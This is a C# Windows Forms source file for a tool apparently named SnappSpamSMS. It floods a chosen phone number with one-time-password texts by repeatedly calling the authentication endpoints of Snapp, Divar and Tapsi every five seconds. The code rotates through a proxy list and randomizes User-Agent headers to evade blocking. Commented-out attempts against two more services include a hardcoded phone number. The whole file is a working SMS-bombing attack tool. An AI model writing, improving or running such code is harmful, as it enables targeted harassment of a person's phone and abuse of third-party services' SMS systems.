using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SnappSpamSMS
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        bool stop = false;
        string strgoodproxies = "";
        int ok = 0;
        int fail = 0;
        private void button1_Click(object sender, EventArgs e)
        {
            stop = false;
            for (int i = 0; i < richTextBox1.Lines.Length; i++)
            {
                //Snapp
                SendMSGArgs SnappMessageSend = new SendMSGArgs() { Data = "{\"cellphone\":\"" + PhoneNumberTxtBx.Text + "\"}", Proxy = richTextBox1.Lines[i], Server = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp" };
                BackgroundWorker Bw1 = new BackgroundWorker();
                Bw1.DoWork += Bw1_DoWork;
                Bw1.RunWorkerAsync(SnappMessageSend);
                if (i < richTextBox1.Lines.Length-1)
                {
                    i++;
                }
                //Divar
                SendMSGArgs Divar = new SendMSGArgs() { Data = "{\"phone\":\"" + PhoneNumberTxtBx.Text + "\"}", Proxy = richTextBox1.Lines[i], Server = "https://api.divar.ir/v5/auth/authenticate" };
                BackgroundWorker Bw2 = new BackgroundWorker();
                Bw2.DoWork += Bw2_DoWork;
                Bw2.RunWorkerAsync(Divar);
                if (i < richTextBox1.Lines.Length-1)
                {
                    i++;
                }
                //Tap30
                SendMSGArgs Tapsi = new SendMSGArgs() { Data = "{\"credential\":{\"phoneNumber\":\"" + PhoneNumberTxtBx.Text + "\",\"role\":\"PASSENGER\"}}", Proxy = richTextBox1.Lines[i], Server = "https://api.tapsi.cab/api/v2/user" };
                BackgroundWorker Bw3 = new BackgroundWorker();
                Bw3.DoWork += Bw3_DoWork;
                Bw3.RunWorkerAsync(Tapsi);
            }
            #region Foreach Method
            //foreach (string item in richTextBox1.Lines)
            //{
            //Snapp
            //SendMSGArgs SnappMessageSend = new SendMSGArgs() { Data = "{\"cellphone\":\"" + PhoneNumberTxtBx.Text + "\"}", Proxy = item, Server = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp" };
            //BackgroundWorker Bw1 = new BackgroundWorker();
            //Bw1.DoWork += Bw1_DoWork;
            //Bw1.RunWorkerAsync(SnappMessageSend);

            //Divar
            //SendMSGArgs Divar = new SendMSGArgs() { Data = "{\"phone\":\"" + PhoneNumberTxtBx.Text + "\"}", Proxy = item, Server = "https://api.divar.ir/v5/auth/authenticate" };
            //BackgroundWorker Bw2 = new BackgroundWorker();
            //Bw2.DoWork += Bw2_DoWork;
            //Bw2.RunWorkerAsync(Divar);

            //Tap30
            //SendMSGArgs Tapsi = new SendMSGArgs() { Data = "{\"credential\":{\"phoneNumber\":\"" + PhoneNumberTxtBx.Text + "\",\"role\":\"PASSENGER\"}}", Proxy = item, Server = "https://api.tapsi.cab/api/v2/user" };
            //BackgroundWorker Bw3 = new BackgroundWorker();
            //Bw3.DoWork += Bw3_DoWork;
            //Bw3.RunWorkerAsync(Tapsi);

            //Sheypoor_FAILED
            //SendMSGArgs Sheypoor = new SendMSGArgs() { Data = new StringContent("username=09390683878&csrf-key=T05WQm1pSGlkemQ0SnZmSUZsVnFyUT09", Encoding.UTF8, "application/json"), Proxy = item, Server = "https://www.sheypoor.com/auth" };
            //BackgroundWorker Bw4 = new BackgroundWorker();
            //Bw4.DoWork += Bw1_DoWork;
            //Bw4.RunWorkerAsync(Sheypoor);
            //Snappfood_FAILED
            //StringContent content1 = new StringContent("cellphone="+PhoneNumberTxtBx.Text, Encoding.UTF8, "application/json");
            //SendMSGArgs SnappFood = new SendMSGArgs() { Data =content1 , Proxy = item, Server = "https://snappfood.ir/customer/app-dl/send" };
            //BackgroundWorker Bw2 = new BackgroundWorker();
            //Bw2.DoWork += Bw1_DoWork;
            //Bw2.RunWorkerAsync(SnappFood);
            //}
            #endregion
        }
        private void button2_Click(object sender, EventArgs e)
        {
            stop = true;
        }

        private async void Bw3_DoWork(object sender, DoWorkEventArgs e)
        {
            int tries = 0;
            SendMSGArgs args = new SendMSGArgs();
            args.Data = ((SendMSGArgs)e.Argument).Data;
            args.Proxy = ((SendMSGArgs)e.Argument).Proxy;
            args.Server = ((SendMSGArgs)e.Argument).Server;
            while (true)
            {
                if (stop)
                {
                    break;
                }
                try
                {
                    HttpClientHandler clientHandler = new HttpClientHandler() { UseProxy = true, Proxy = new WebProxy((string)args.Proxy) };
                    HttpClient client = new HttpClient(clientHandler);
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/" + new Random().Next(0, 99) + "." + new Random().Next(0, 99));
                    StringContent content = new StringContent(args.Data, Encoding.UTF8, "application/json");
                    HttpResponseMessage Message = await client.PostAsync(args.Server, content);
                    //HttpResponseMessage Message = await client.PostAsync("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", content);
                    string s = await Message.Content.ReadAsStringAsync();
                    if (Message.StatusCode == HttpStatusCode.OK)
                    {
                        //e.Result = "OK";
                        if (s.ToLower().Contains("false") || s.ToLower().Contains("fail"))
                        {
                            fail++;
                            MessageBox.Show("OH!," + s);
                        }
                        else
                        {
                            ok++;
                            if (!strgoodproxies.Contains(args.Proxy))
                            {
                                strgoodproxies += args.Proxy + "\n";
                            }
                        }
                    }
                    else if (s.ToLower().Contains("ok"))
                    {
                        ok++;
                        if (!strgoodproxies.Contains(args.Proxy))
                        {
                            strgoodproxies += args.Proxy + "\n";
                        }
                    }
                    else
                    {
                        //e.Result = "Fail";
                        fail++;
                    }
                    clientHandler.Dispose();
                    client.Dispose();
                    Message.Dispose();
                    content.Dispose();
                    s = null;
                }
                catch (Exception)
                {
                    if (tries >= 20)
                    {
                        break;
                    }
                    tries++;
                    fail++;
                }
                await Task.Delay(5000);
            }
            args = null;
        }

        private async void Bw2_DoWork(object sender, DoWorkEventArgs e)
        {
            int tries = 0;
            SendMSGArgs args = new SendMSGArgs();
            args.Data = ((SendMSGArgs)e.Argument).Data;
            args.Proxy = ((SendMSGArgs)e.Argument).Proxy;
            args.Server = ((SendMSGArgs)e.Argument).Server;
            while (true)
            {
                if (stop)
                {
                    break;
                }
                try
                {
                    HttpClientHandler clientHandler = new HttpClientHandler() { UseProxy = true, Proxy = new WebProxy((string)args.Proxy) };
                    HttpClient client = new HttpClient(clientHandler);
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/" + new Random().Next(0, 99) + "." + new Random().Next(0, 99));
                    StringContent content = new StringContent(args.Data, Encoding.UTF8, "application/json");
                    HttpResponseMessage Message = await client.PostAsync(args.Server, content);
                    //HttpResponseMessage Message = await client.PostAsync("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", content);
                    string s = await Message.Content.ReadAsStringAsync();
                    if (Message.StatusCode == HttpStatusCode.OK)
                    {
                        //e.Result = "OK";
                        if (s.ToLower().Contains("false") || s.ToLower().Contains("fail"))
                        {
                            fail++;
                            MessageBox.Show("OH!," + s);
                        }
                        else
                        {
                            ok++;
                            if (!strgoodproxies.Contains(args.Proxy))
                            {
                                strgoodproxies += args.Proxy + "\n";
                            }
                        }
                    }
                    else if (s.ToLower().Contains("ok"))
                    {
                        ok++;
                        if (!strgoodproxies.Contains(args.Proxy))
                        {
                            strgoodproxies += args.Proxy + "\n";
                        }
                    }
                    else
                    {
                        //e.Result = "Fail";
                        fail++;
                    }
                    clientHandler.Dispose();
                    client.Dispose();
                    Message.Dispose();
                    content.Dispose();
                    s = null;
                }
                catch (Exception)
                {
                    if (tries >= 20)
                    {
                        break;
                    }
                    tries++;
                    fail++;
                }
                await Task.Delay(5000);
            }
        }

        private async void Bw1_DoWork(object sender, DoWorkEventArgs e)
        {
            int tries = 0;
            SendMSGArgs args = new SendMSGArgs();
            args.Data = ((SendMSGArgs)e.Argument).Data;
            args.Proxy = ((SendMSGArgs)e.Argument).Proxy;
            args.Server = ((SendMSGArgs)e.Argument).Server;
            while (true)
            {
                if (stop)
                {
                    break;
                }
                try
                {
                    HttpClientHandler clientHandler = new HttpClientHandler() { UseProxy = true, Proxy = new WebProxy((string)args.Proxy) };
                    HttpClient client = new HttpClient(clientHandler);
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/" + new Random().Next(0, 99) + "." + new Random().Next(0, 99));
                    StringContent content = new StringContent(args.Data, Encoding.UTF8, "application/json");
                    HttpResponseMessage Message = await client.PostAsync(args.Server, content);
                    //HttpResponseMessage Message = await client.PostAsync("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", content);
                    string s = await Message.Content.ReadAsStringAsync();
                    if (Message.StatusCode == HttpStatusCode.OK)
                    {
                        //e.Result = "OK";
                        if (s.ToLower().Contains("false") || s.ToLower().Contains("fail"))
                        {
                            fail++;
                            MessageBox.Show("OH!," + s);
                        }
                        else
                        {
                            ok++;
                            if (!strgoodproxies.Contains(args.Proxy))
                            {
                                strgoodproxies += args.Proxy + "\n";
                            }
                        }
                    }
                    else if (s.ToLower().Contains("ok"))
                    {
                        ok++;
                        if (!strgoodproxies.Contains(args.Proxy))
                        {
                            strgoodproxies += args.Proxy + "\n";
                        }
                    }
                    else
                    {
                        //e.Result = "Fail";
                        fail++;
                    }
                    clientHandler.Dispose();
                    client.Dispose();
                    Message.Dispose();
                    content.Dispose();
                    s = null;
                }
                catch (Exception)
                {
                    if (tries >= 20)
                    {
                        break;
                    }
                    tries++;
                    fail++;
                }
                await Task.Delay(5000);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            OKLabel.Text = ok.ToString();
            FailLabel.Text = fail.ToString();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            GoodProxies.Text = strgoodproxies;
        }
    }
}
